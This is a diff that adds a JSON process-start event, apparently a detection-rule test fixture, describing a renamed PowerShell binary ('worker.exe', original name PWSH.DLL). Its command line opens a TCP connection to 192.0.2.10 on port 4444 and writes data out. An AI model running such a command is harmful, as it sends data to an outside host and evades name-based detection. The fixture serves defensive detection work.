@@ -1,0 +1,23 @@
+{
+  "event": {
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start"
+    ],
+    "kind": "event"
+  },
+  "host": {
+    "os": {
+      "type": "windows"
+    }
+  },
+  "process": {
+    "name": "worker.exe",
+    "pe": {
+      "original_file_name": "PWSH.DLL"
+    },
+    "command_line": "worker.exe -Command \"$c=[NET.SOCKETS.TCPCLIENT]::new('192.0.2.10',4444);$s=$c.GETSTREAM();$s.WRITE($b,0,$b.Length)\""
+  }
+}
